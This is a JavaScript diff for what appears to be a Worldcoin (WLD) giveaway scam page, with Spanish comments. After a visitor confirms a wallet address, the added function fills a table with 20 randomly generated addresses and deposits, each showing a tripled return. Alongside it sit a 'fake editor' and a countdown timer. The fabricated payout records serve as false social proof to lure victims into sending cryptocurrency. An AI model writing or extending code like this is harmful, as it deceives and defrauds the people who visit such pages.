@@ -273,20 +273,40 @@ document.getElementById('btnLogin').addEventListener('click', function() {
 
        
 
- document.getElementById('confirmAddress').addEventListener('click', function() {
+document.getElementById('confirmAddress').addEventListener('click', function() {
     const userAddress = document.getElementById('worldcoinAddressInput').value;
-    // Verifica si el usuario ha ingresado alguna dirección y si es una dirección ERC20 válida
     if (userAddress.trim() !== "" && esDireccionERC20Valida(userAddress)) {
-        // Si la dirección es válida, procede con el resto del script
         document.getElementById('confirmAddress').style.display = 'none';
         alert('Dirección confirmada. Ahora puedes copiarla.');
         mostrarFakeEditor();
         iniciarContador();
+        generarDepositos(); // Esta función llena la tabla con los datos de depósitos.
+        document.getElementById('depositosTabla').style.display = 'table'; // Asegura que tu tabla esté visible después de confirmar la dirección.
     } else {
-        // Si la dirección no es válida, muestra una alerta y no continúes con el script
         alert('Por favor, ingresa una dirección ERC20 válida.');
     }
 });
+
+function generarDepositos() {
+  const tabla = document.getElementById("depositosTabla");
+
+  // Asegúrate de limpiar la tabla antes de añadir nuevas filas para evitar duplicados si el usuario confirma la dirección múltiples veces.
+  while(tabla.rows.length > 1) {
+    tabla.deleteRow(1);
+  }
+
+  for (let i = 0; i < 20; i++) {
+    const deposito = generarDepositoAleatorio();
+    const direccion = generarDireccionAleatoria();
+    const retorno = deposito * 3; // Retorno triplicado
+
+    const fila = tabla.insertRow();
+    fila.insertCell().textContent = direccion;
+    fila.insertCell().textContent = deposito.toFixed(2) + " WLD";
+    fila.insertCell().textContent = retorno.toFixed(2) + " WLD";
+  }
+}
+
 
 // Función para verificar si una cadena corresponde a una dirección ERC20 válida
 function esDireccionERC20Valida(direccion) {
